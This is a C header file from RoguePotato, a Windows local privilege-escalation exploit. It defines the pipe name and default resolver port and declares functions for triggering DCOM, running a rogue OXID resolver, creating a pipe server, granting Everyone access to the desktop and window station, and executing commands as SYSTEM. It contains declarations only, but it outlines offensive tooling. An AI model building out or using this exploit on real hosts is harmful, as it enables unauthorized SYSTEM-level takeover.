#pragma once
#define PIPE_NAME L"RoguePotato"
#define DEFAULT_RESOLVER_LISTENING_PORT L"9999"
#define THREAD_TIMEOUT 9000
BOOL EnablePriv(HANDLE, LPCTSTR);
int ExecuteSystem(wchar_t*, HANDLE);
void TriggerDCOM();
PSID BuildEveryoneSid();
BOOL AddTheAceDesktop(HDESK, PSID);
BOOL AddTheAceWindowStation(HWINSTA, PSID);
void Usage();
void TriggerDCOM();
DWORD WINAPI ThreadTriggerDCOM(LPVOID lParams);
void RoguePotato(wchar_t* commandline, wchar_t* pipe_placeholder, wchar_t* listening_port, wchar_t* portal_port);
int RunRogueOxidResolver(char* listening_port);
int RunPortalController(char* portal_port, wchar_t* remote_ip, char* resolver_listening_port);
int ExecuteSystem(wchar_t*, HANDLE);
int CreatePipeServer(wchar_t*);
